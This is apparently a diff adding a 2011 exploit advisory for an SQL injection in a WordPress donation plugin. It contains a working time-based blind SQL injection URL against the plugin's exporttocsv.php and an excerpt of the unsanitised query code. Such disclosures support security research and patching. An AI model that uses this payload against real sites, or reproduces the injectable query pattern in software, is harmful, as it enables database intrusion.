@@ -1,0 +1,18 @@
+# Exploit Title: WordPress Donation plugin <= 1.0 SQL Injection Vulnerability
+# Date: 2011-08-31
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/wordpress-donation-plugin-with-goals-and-paypal-ipn-by-nonprofitcmsorg.zip
+# Version: 1.0 (tested)
+# Note: WordPress Donation Plugin with Goals and Paypal IPN by NonprofitCMS.org (full name)
+
+---
+PoC
+---
+http://www.site.com/wp-content/plugins/wordpress-donation-plugin-with-goals-and-paypal-ipn-by-nonprofitcmsorg/exporttocsv.php?did=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)--%20
+
+---------------
+Vulnerable code
+---------------
+$dId = $_REQUEST["did"];
+...
+$campaigns = $wpdb->get_results("SELECT * FROM $table_name WHERE camp_id=$dId");
